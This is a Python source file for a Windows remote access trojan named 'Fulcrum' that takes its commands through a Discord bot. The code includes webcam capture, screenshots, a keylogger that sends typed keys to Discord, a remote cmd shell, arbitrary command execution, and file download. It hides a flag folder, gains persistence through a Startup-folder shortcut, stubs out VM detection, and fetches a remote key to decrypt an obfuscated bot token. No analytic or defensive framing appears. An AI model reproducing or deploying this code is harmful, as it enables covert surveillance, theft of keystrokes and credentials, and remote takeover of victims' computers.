import os
import sys
import requests
import subprocess
import asyncio
import discord
from dotenv import load_dotenv
import ctypes
import json
import wmi
import time
import cv2
import mss
from win32com.client import Dispatch
from PIL import Image
import keyboard
from mss import mss
from datetime import datetime
from cryptography.fernet import Fernet
import tempfile
import threading

FLAG_PATH = "C:\\ProgramData\\FUC Cache"
INSTALL_PATH = "C:\\ProgramData\\FUC HUB"

DECRYPTION_KEY_URL = "https://cdn.discordapp.com/attachments/1274832417898627134/1283497162545692823/key.key?ex=66e33561&is=66e1e3e1&hm=5ced91f6290c0f173bcdadece01083b00951386e1871937ac4d98c52b9c5c167&"
first_execution = False

# default(waiting for commands) shell(in remote shell)
mode = "default"

try:
    START_FOLDER = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    load_dotenv()
    TOKEN = os.getenv('TOKEN')
except:
    sys.exit()

# discord bot intents
intents = discord.Intents.default()
intents.message_content = True
intents.messages = True
intents.guilds = True
# bot client with intents
client = discord.Client(intents=intents)


@client.event
async def on_ready():   # called when the client connected to discord
    global first_execution

    print(f'logged in as {client.user}')

    print("start up")
    if first_execution:
        print("first execution")
        await fulcrum_util.create_channel()
    try:
        profile_data = profile_manager.get_profile_data()

        channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])

        await channel.send(f"*{profile_data["user_name"]} logged on*")

    except Exception as e:
        await fulcrum_util.return_error_2_channel(e)


@client.event
async def on_message(message):  # called when discord message was received
    global mode
    # load profile data
    profile_data = profile_manager.get_profile_data()

    content = message.content
    # searching for channel with the profiles channel name
    channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])

    # ignore messages not inside the correct channels and messages send by the beacon/client itself
    if (message.author == client.user or str(message.channel) != profile_data["channel_name"]
            and str(message.channel) != "all-channel"):
        return

    match mode:
        case "default":
            # getting the first part of content until white space
            command = content.split(' ')[0]
            match command:
                case "-TP":   # TAKE PICTURE
                    content = content.strip("-TP")
                    cam_index = 0
                    if content:
                        content = content.replace(" ", "")
                        cam_index = int(content)
                    await fulcrum_util.take_picture(cam_index)

                case "-SG":     # SCREEN GRAB
                    content = content.strip("-SG")
                    screen_index = 0
                    if content:
                        content = content.replace(" ", "")
                        screen_index = int(content)
                    await fulcrum_util.take_screenshot(screen_index)

                case "-SHELL":  # start shell subprocess
                    mode = "shell"
                    shell_handler.start_shell()
                    await channel.send("**CMD SHELL ACTIVE**")
                    await channel.send(f"{os.getcwd()}")

                case "-KL":     # START KEY LOGGER
                    key_logger.start_key_logger()
                case "-UKL":    # UNHOOK KEY LOGGER
                    key_logger.stop_key_logger()
                case "-GLK":    # GET LOGGED KEYS
                    key_logger.send_logged_key_2_discord()

                case "-UF":     # UPLOAD FILE
                    fulcrum_util.download_attached_file(message)

                case "-RC":     # RUN COMMAND
                    content = content.strip("-RC")
                    response = fulcrum_util.run_command(content)
                    if response:
                        await channel.send(response)
                    else:
                        await channel.send("command ran with no response")

                case "-MB":     # MESSAGE BOX
                    content = content.strip("-MB")
                    await fulcrum_util.display_message_box(content)


        case "shell":   # active shell
            # terminate shell if the user sends quit
            if content.startswith("quit"):
                mode = "default"
                shell_handler.quit()
                await channel.send("**CMD SHELL TERMINATED**")
                return

            # flush input to shell
            await shell_handler.flush_input(content)


class FulcrumUtil:
    def __init__(self):
        message_boxes = []
    def check_for_vm(self):
        # TODO check for typical vm names
        # TODO find solution to detect the windows defender vm
        return False

    def run_command(self, command):
        return os.popen(command).read()

    async def display_message_box(self, content):
        # replace \n with VBScript's newline char
        content = content.replace('\n', '" & vbCrLf & "')

        # creating a temporary Visual Basic Script that displays the message box
        with tempfile.NamedTemporaryFile(delete=False, suffix='.vbs') as temp_vbs:
            vbs_script = f'''
            Set WshShell = WScript.CreateObject("WScript.Shell")
            WshShell.Popup "{content}", 0, "...", 0
            '''
            temp_vbs.write(vbs_script.encode('utf-8'))
            temp_vbs_path = temp_vbs.name

        # run the VBScript file with subprocess
        subprocess.Popen(['wscript', temp_vbs_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # remove the temp file
        time.sleep(1)
        os.remove(temp_vbs_path)

    async def create_channel(self):
        # create new channel
        try:
            profile_data = profile_manager.get_profile_data()

            guild = client.guilds[0]
            new_channel = await guild.create_text_channel(profile_data["channel_name"])

            await new_channel.send("***NEW BEACON CONNECTED***")
            await new_channel.send(
                f'*user name: {profile_data["user_name"]}\nhardware id: {profile_data["hardware_id"]}*')
        except Exception as e:
            await self.return_error_2_channel(e)

    async def return_error_2_channel(self, error_message):
        error_message = str(error_message)
        try:
            profile_data = profile_manager.get_profile_data()

            channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
            if channel is not None:
                await channel.send("'''" + error_message + "'''")
            else:
                print("No channel")
                print("trying to create channel")
                await self.create_channel()

        except:
            print("error returning error")

    async def take_picture(self, cam_index):
        print("-TP")
        try:
            # taking a picture
            cam = cv2.VideoCapture(cam_index)
            ret, frame = cam.read()
            cam.release()
            cv2.imwrite("captured_frame.jpg", frame)

            # sending picture into the discord channel
            profile_data = profile_manager.get_profile_data()

            channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
            with open("captured_frame.jpg", 'rb') as image_file:
                await channel.send(content=f"**{profile_data["user_name"]}\t-\t{datetime.now()}\t-\tcam:{cam_index}**",
                                   file=discord.File(image_file, "image.jpg"))

            os.remove("captured_frame.jpg")

        except Exception as e:
            await self.return_error_2_channel(e)

    async def take_screenshot(self, screen_index):
        print("Taking screenshot...")
        try:
            with mss() as sct:
                monitors = sct.monitors
                monitor = monitors[screen_index]
                screenshot = sct.grab(monitor)
                image = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")

                image.save("captured_screen.png")

            profile_data = profile_manager.get_profile_data()

            channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
            with open("captured_screen.png", 'rb') as image_file:
                if screen_index == 0:
                    screen_index = "ALL"  # replacing screen index 0 with ALL string for better readability

                await channel.send(
                    content=f"**{profile_data["user_name"]}\t-\t{datetime.now()}\t-\tscreen:{screen_index}**",
                    file=discord.File(image_file, "image.jpg"))

            os.remove("captured_screen.png")

        except Exception as e:
            print(f"An error occurred: {str(e)}")
            await self.return_error_2_channel(e)

    def create_flag(self):
        try:
            os.mkdir(FLAG_PATH)
            FILE_ATTRIBUTE_HIDDEN = 0x02
            ctypes.windll.kernel32.SetFileAttributesW(FLAG_PATH, FILE_ATTRIBUTE_HIDDEN)
        except Exception as e:
            self.return_error_2_channel(e)

    def check_flags(self):
        if os.path.isdir(FLAG_PATH):
            return True
        return False

    def get_persistence(self):
        # using the windows startup folder
        try:
            self._create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"),
                                  os.path.join(INSTALL_PATH, os.path.basename(__file__)))

        except Exception as e:
            print(e)
            self.return_error_2_channel(e)

    def _create_shortcut(self, shortcut_path, target_path):
        # creating a windows shortcut
        try:
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortcut(shortcut_path)
            shortcut.TargetPath = target_path
            shortcut.WorkingDirectory = os.path.dirname(target_path)
            shortcut.save()
        except Exception as e:
            self.return_error_2_channel(e)

    def download_attached_file(self, message):
        try:
            url = str(message.attachments[0])
            # get file from server
            response = requests.get(url, allow_redirects=True)

            # get file name from url (only works with discord url)
            question_mark_index = url.find("?")
            filename = url[:question_mark_index]
            last_slash_index = filename.rfind("/")
            filename = filename[last_slash_index + 1:]

            # save file on disc as filename
            with open(filename, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    # Write each chunk to the file
                    file.write(chunk)

        except Exception as e:
            self.return_error_2_channel(e)

    def _download_file(self, url, name):
        response = requests.get(url, allow_redirects=True)
        with open(name, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                # Write each chunk to the file
                f.write(chunk)

    def decrypt_token(self, token):
        # downloading the key.key file and decrypting the bot token
        self._download_file(DECRYPTION_KEY_URL, "key.key")

        with open("key.key", "rb") as f:
            key = f.readline()
            print(key)
            cipher = Fernet(key)
            # remove obfuscation
            decrypted_token = token.swapcase()[4:-4].encode()
            # decrypt token
            decrypted_token = cipher.decrypt(decrypted_token)
        return decrypted_token.decode()



class ShellHandler:
    def __init__(self):
        self.shell_process = None

    def start_shell(self):
        self.shell_process = subprocess.Popen(
            ['cmd.exe'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True
        )

    async def flush_input(self, input):
        # execute input / add flag to know when the command has finished
        self.shell_process.stdin.write(input + " & echo RESPONSE_FINISHED_FLAG" + "\n")
        self.shell_process.stdin.flush()
        await self._send_shell_output_2_discord()

    def quit(self):
        if self.shell_process:
            self.shell_process.terminate()
            self.shell_process = None

    async def _send_shell_output_2_discord(self):
        profile_data = profile_manager.get_profile_data()
        channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
        flag_counter = 0
        output = ""
        time_stamp = time.time()
        print(time_stamp)

        while True:
            # read each line of the response
            try:
                line = await asyncio.to_thread(self.shell_process.stdout.readline)
            except:
                line = "\n"

            # save each line in outputs
            output += line

            # Checking for the flag / second flag = command finished
            if "RESPONSE_FINISHED_FLAG" in line:
                flag_counter += 1
            if flag_counter == 2:
                break

            # sending the output early if the command takes too long
            if time.time() - time_stamp > 1:
                print("early send")
                while len(output) > 2000:
                    await channel.send(output[:2000])
                    output = output[2000:]
                await channel.send(output)

                output = ""
                time_stamp = time.time()

        print("break")
        print(output)
        while len(output) > 2000:
            await channel.send(output[:2000])
            output = output[2000:]
        await channel.send(output)


class KeyLogger:
    def __init__(self):
        self.keys_pressed = []
        self.keyboard_hook = None

    def _on_key_event(self, event):
        print(event.name)
        # saving the key pressed into list
        if len(event.name) <= 1:
            self.keys_pressed.append(event.name)
        else:
            match event.name:
                case "backspace":
                    self.keys_pressed.append("\t BS \t")
                case "space":
                    self.keys_pressed.append(" ")
                case "enter":
                    self.keys_pressed.append("\n")

        # saving the keys_pressed every tenth key press to avoid detection
        if len(self.keys_pressed) >= 10:
            with open("log.l", "a") as key_log_file:
                for key in self.keys_pressed:
                    key_log_file.write(key)

                self.keys_pressed = []

    def start_key_logger(self):     # TODO add extra channel for key logger (maybe)
        self.keyboard_hook = keyboard.on_press(self._on_key_event)
        # create log file
        with open("log.l", "w"):
            pass

    def send_logged_key_2_discord(self):
        try:
            # checking if there are any logged keys not saved yet
            if len(self.keys_pressed) > 0:
                with open("log.l", "a") as key_log_file:
                    for key in self.keys_pressed:
                        key_log_file.write(key)

                    self.keys_pressed = []

            # reading data from log.l file and sending it to discord
            with open("log.l", "r") as key_log_file:
                logged_keys = key_log_file.read()
                profile_data = profile_manager.get_profile_data()
                channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
                asyncio.run_coroutine_threadsafe(channel.send(logged_keys), client.loop)
            # clear file
            open('log.l', 'w').close()

        except Exception as e:
            fulcrum_util.return_error_2_channel(e)

    def stop_key_logger(self):  # TODO FIX THIS
        try:
            # unhooking the key logging function
            if self.keyboard_hook:
                keyboard.unhook(self.keyboard_hook)

            # checking if there are any logged keys not saved yet
            if len(self.keys_pressed) > 0:
                with open("log.l", "r+") as key_log_file:
                    for key in self.keys_pressed:
                        key_log_file.write(key)

                    self.keys_pressed = []

        except Exception as e:
            fulcrum_util.return_error_2_channel(e)


class ProfileManager:
    def __init__(self):
        self.profile_data = None

    def create_unique_profile(self):
        c = wmi.WMI()
        mainboard_serial = c.Win32_BaseBoard()[0].SerialNumber.strip()
        profile = {
            'hardware_id': f'{mainboard_serial}',
            'user_name': f'{os.getlogin()}',
            'channel_name': f'{os.getlogin()}-{mainboard_serial}',
        }
        with open('profile.json', 'w') as f:
            json.dump(profile, f)

    def get_profile_data(self):
        if not self.profile_data:
            with open("profile.json", "r") as json_file:
                self.profile_data = json.load(json_file)

        return self.profile_data


def main():
    global first_execution, TOKEN
    global key_logger, persistence_manager, discord_bot_manager, profile_manager, shell_handler, fulcrum_util
    key_logger = KeyLogger()
    profile_manager = ProfileManager()
    shell_handler = ShellHandler()
    fulcrum_util = FulcrumUtil()

    # checking for a vm
    if fulcrum_util.check_for_vm() is True:
        print("start up")
        a = 1+1-42
        b = "03985027"
        c = b + "2034"
        print(str(a) + c)
        print("CONNECTED")
        while True:
            time.sleep(1)
            a += 1

    print("no vm")

    # checking if the flag folder exists (checking if it is the first execution of fulcrum)
    if fulcrum_util.check_flags() is False:
        print("no flag")
        fulcrum_util.create_flag()
        fulcrum_util.get_persistence()
        profile_manager.create_unique_profile()
        first_execution = True

    # decrypting token and starting discord bot
    decrypted_token = fulcrum_util.decrypt_token(str(TOKEN))
    client.run(decrypted_token)


if __name__ == '__main__':
    main()
